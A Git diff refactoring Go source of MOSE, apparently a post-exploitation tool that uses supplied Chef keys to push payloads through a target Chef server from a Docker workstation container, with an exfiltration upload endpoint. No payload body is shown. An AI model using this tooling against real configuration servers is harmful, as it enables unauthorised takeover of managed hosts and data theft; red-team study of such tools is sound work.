@@ -11,7 +11,7 @@ import (
 	"github.com/docker/docker/api/types/container"
 	"github.com/docker/docker/client"
 	"github.com/gobuffalo/packr/v2"
-	"github.com/master-of-servers/mose/pkg/moseutils"
+	"github.com/l50/MOSE/pkg/moseutils"
 	"github.com/mholt/archiver"
 	"io"
 	"io/ioutil"
@@ -29,6 +29,14 @@ import (
 var (
 	signalChan chan os.Signal
 )
+
+type KnifeTemplateArgs struct {
+	ChefNodeName    string
+	ChefClientKey   string
+	OrgName     string
+	ChefValidationKey    string
+	TargetChefServer    string
+}
 
 func copyFiles(cli *client.Client, id string, files []string, tar_location string, docker_loc string) {
 	ctx := context.Background()
@@ -71,7 +79,7 @@ func simpleRun(cli *client.Client, id string, cmd []string) types.IDResponse {
 	if err = cli.ContainerExecStart(ctx, execId.ID, types.ExecStartCheck{}); err != nil {
 		log.Fatalln(err)
 	}
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("ran command: %v", cmd)
 	}
 
@@ -93,7 +101,7 @@ func build(cli *client.Client) {
 	defer dockerBuildContext.Close()
 
 	opts := types.ImageBuildOptions{
-		Tags:       []string{imageName},
+		Tags:       []string{UserInput.ImageName},
 		Dockerfile: "dockerfiles/Dockerfile",
 	}
 
@@ -107,7 +115,7 @@ func build(cli *client.Client) {
 	if err != nil {
 		log.Fatalln(err.Error())
 	}
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("********* %s **********", ibr.OSType)
 		log.Println(string(response))
 	}
@@ -117,14 +125,14 @@ func run(cli *client.Client) string {
 	ctx := context.Background()
 
 	hostconfig := &container.HostConfig{}
-	if rhost != "" {
+	if UserInput.Rhost != "" {
 		hostconfig = &container.HostConfig{
-			ExtraHosts: []string{rhost},
+			ExtraHosts: []string{UserInput.Rhost},
 		}
 	}
 
 	resp, err := cli.ContainerCreate(ctx, &container.Config{
-		Image:        imageName,
+		Image:        UserInput.ImageName,
 		Tty:          true,
 		OpenStdin:    true,
 		AttachStdin:  true,
@@ -133,14 +141,14 @@ func run(cli *client.Client) string {
 	},
 		hostconfig,
 		nil,
-		containerName,
+		UserInput.ContainerName,
 	)
 
 	if err != nil {
 		panic(err)
 	}
 
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("Running container with id %v", resp.ID)
 	}
 
@@ -153,7 +161,7 @@ func run(cli *client.Client) string {
 
 func copyToDocker(cli *client.Client, id string) {
 
-	copyFiles(cli, id, []string{chefClientKey, chefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")
+	copyFiles(cli, id, []string{UserInput.ChefClientKey, UserInput.ChefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")
 
 	log.Println("Running knife ssl fetch, please wait...")
 	_ = simpleRun(cli, id, []string{"knife", "ssl", "fetch"})
@@ -165,16 +173,16 @@ func runMoseInContainer(cli *client.Client, id string, osTarget string) {
 	ctx := context.Background()
 
 	payloadPath := "payloads/chef-linux"
-	if filePath != "" {
-		payloadPath = filePath
+	if UserInput.FilePath != "" {
+		payloadPath = UserInput.FilePath
 	}
 
 	binPath := path.Join("/", path.Base(payloadPath))
 
 	filesToCopy := []string{payloadPath}
 
-	if cmdFileUpload != "" {
-		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(cmdFileUpload)))
+	if UserInput.FileUpload != "" {
+		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(UserInput.FileUpload)))
 	}
 	copyFiles(cli, id, filesToCopy, "tarfiles/main.tar", "/")
 
@@ -196,7 +204,7 @@ func runMoseInContainer(cli *client.Client, id string, osTarget string) {
 		log.Fatalln(err)
 	}
 
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("Running container exec and attach for container ID %v", execId.ID)
 	}
 	hj, err := cli.ContainerExecAttach(ctx, execId.ID, types.ExecStartCheck{Detach: false, Tty: true})
@@ -260,7 +268,7 @@ func runMoseInContainer(cli *client.Client, id string, osTarget string) {
 		log.Fatalln(err)
 	}
 
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("Running container exec and attach for container ID %v", execId.ID)
 	}
 	hj, err = cli.ContainerExecAttach(ctx, execId.ID, types.ExecStartCheck{Detach: false, Tty: true})
@@ -304,22 +312,21 @@ func monitor(cli *client.Client, id string) {
 }
 
 func generateKnife() {
-	cliArgs := cliArgs{
-		NodeName:         chefNodeName,
-		KeyName:          "",
-		OrgName:          targetOrgName,
-		UserOrgName:      attackOrgName,
-		ValidKey:         filepath.Base(chefValidationKey),
-		TargetChefServer: targetChefServer,
-	}
-	if chefClientKey != "" {
-		cliArgs.KeyName = filepath.Base(chefClientKey)
-	}
-	if chefValidationKey != "" {
-		cliArgs.ValidKey = filepath.Base(chefValidationKey)
+	knifeTemplateArgs := KnifeTemplateArgs{
+		ChefNodeName:    UserInput.ChefNodeName,
+		ChefClientKey:   UserInput.ChefClientKey,
+		OrgName:     UserInput.TargetOrgName,
+		ChefValidationKey:    filepath.Base(UserInput.ChefValidationKey),
+		TargetChefServer:    UserInput.TargetChefServer,
 	}
 
-	paramLoc := filepath.Join("templates", cmTarget)
+	if UserInput.ChefClientKey != "" {
+		knifeTemplateArgs.ChefClientKey = filepath.Base(UserInput.ChefClientKey)
+	}
+	if UserInput.ChefValidationKey != "" {
+		knifeTemplateArgs.ChefValidationKey = filepath.Base(UserInput.ChefValidationKey)
+	}
+	paramLoc := filepath.Join("templates", UserInput.CMTarget)
 	box := packr.New("Params", "|")
 	box.ResolutionDir = paramLoc
 	// knife template
@@ -341,7 +348,7 @@ func generateKnife() {
 		log.Fatalln(err)
 	}
 
-	err = t.Execute(f, cliArgs)
+	err = t.Execute(f, UserInput)
 
 	if err != nil {
 		log.Fatal("Execute: ", err)
@@ -352,40 +359,40 @@ func generateKnife() {
 
 func setupChefWorkstationContainer(localIP string, exfilPort int, osTarget string) {
 	signalChan = make(chan os.Signal, 1)
-	if verbose {
+	if UserInput.Debug {
 		log.Printf("Creating exfil endpoint at %v:%v", localIP, exfilPort)
-		log.Printf("Cur orgname: %s", targetOrgName)
+		log.Printf("Cur orgname: %s", UserInput.TargetOrgName)
 	}
 
 	createUploadRoute(localIP, exfilPort)
-	log.Printf("New orgname: %s", targetOrgName)
+	log.Printf("New orgname: %s", UserInput.TargetOrgName)
 	generateKnife()
 	cli, err := client.NewClientWithOpts(client.WithVersion("1.37"))
 
 	if err != nil {
 		log.Fatalf("Could not get docker client: %v", err)
 	}
-	if verbose {
+	if UserInput.Debug {
 		log.Println("Building Workstation container, please wait...")
 	}
 	build(cli)
-	if verbose {
+	if UserInput.Debug {
 		log.Println("Starting Workstation container, please wait...")
 	}
 	id := run(cli)
 
 	go monitor(cli, id)
 
-	if verbose {
+	if UserInput.Debug {
 		log.Println("Copying keys and relevant resources to workstation container, please wait...")
 	}
 	copyToDocker(cli, id)
-	if verbose {
+	if UserInput.Debug {
 		log.Println("Running MOSE in Workstation container, please wait...")
 	}
 	runMoseInContainer(cli, id, osTarget)
 
-	if verbose {
+	if UserInput.Debug {
 		log.Println("Running MOSE in Workstation container, please wait...")
 	}
 	removeContainer(cli, id)
